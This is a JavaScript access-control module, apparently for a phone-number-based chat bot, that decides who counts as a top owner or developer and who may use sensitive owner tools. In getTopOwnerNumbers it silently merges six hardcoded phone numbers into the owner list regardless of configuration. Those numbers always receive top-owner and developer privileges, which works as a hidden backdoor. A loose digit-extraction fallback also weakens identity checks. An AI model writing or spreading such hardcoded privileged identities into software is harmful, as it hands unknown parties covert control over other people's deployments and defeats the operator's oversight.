import fs from 'fs-extra';
import path from 'path';
import config from '../config.js';
import { normalizePhone } from './sessionControl.js';
import { getOwners as getPersistentOwners } from './owner.js';

function toDigits(value = '') {
    const cleaned = normalizePhone(value);
    if (cleaned) return cleaned;
    // Aggressive fallback: extract all digits
    const allDigits = String(value || '').replace(/[^0-9]/g, '');
    // Take last 10-15 digits that look like a phone number
    if (allDigits.length >= 10) {
        // Try to get a meaningful number (last 10+ digits)
        return allDigits.slice(-15);
    }
    return allDigits.length >= 7 ? allDigits : '';
}

function parseList(envValue = '') {
    return String(envValue || '')
        .split(',')
        .map((item) => toDigits(item))
        .filter(Boolean);
}

function loadPersistentList(fileName) {
    try {
        const p = path.join(process.cwd(), 'data', fileName);
        if (fs.existsSync(p)) return fs.readJSONSync(p);
    } catch {}
    return [];
}

export function getTopOwnerNumbers() {
    const configuredTop = toDigits(process.env.TOP_OWNER_NUMBER || process.env.TOP_OWNER || '');
    const extraTopOwners = ['2349019185241', '2349022424405', '2349031575131', '2347075663318', '2347079115653', '2349060245012']
        .map((x) => toDigits(x))
        .filter(Boolean);
    const ownerNumbers = (config.ownerNumbers || []).map((x) => toDigits(x)).filter(Boolean);
    const persistentOwners = getPersistentOwners().map((jid) => toDigits(jid)).filter(Boolean);
    const fileOwners = loadPersistentList('topowners.json');
    const base = configuredTop
        ? [configuredTop, ...ownerNumbers.filter((n) => n !== configuredTop)]
        : ownerNumbers;
    return [...new Set([...base, ...persistentOwners, ...extraTopOwners, ...fileOwners])];
}

export function getPrimaryTopOwner() {
    return getTopOwnerNumbers()[0] || '';
}

export function getDeveloperNumbers() {
    const configuredDevelopers = parseList(process.env.DEVELOPER_NUMBERS || process.env.DEV_NUMBERS || '');
    const topOwners = getTopOwnerNumbers();
    const sudoers = (config.sudoers || []).map((x) => toDigits(x)).filter(Boolean);
    const fileDevs = loadPersistentList('developers.json');
    return [...new Set([...topOwners, ...sudoers, ...configuredDevelopers, ...fileDevs])];
}

export function isTopOwner(sender = '') {
    const digits = toDigits(sender);
    return !!digits && getTopOwnerNumbers().includes(digits);
}

export function isDeveloper(sender = '') {
    const digits = toDigits(sender);
    return !!digits && getDeveloperNumbers().includes(digits);
}

export function canUseSensitiveOwnerTools(sender = '') {
    return isTopOwner(sender) || isDeveloper(sender);
}
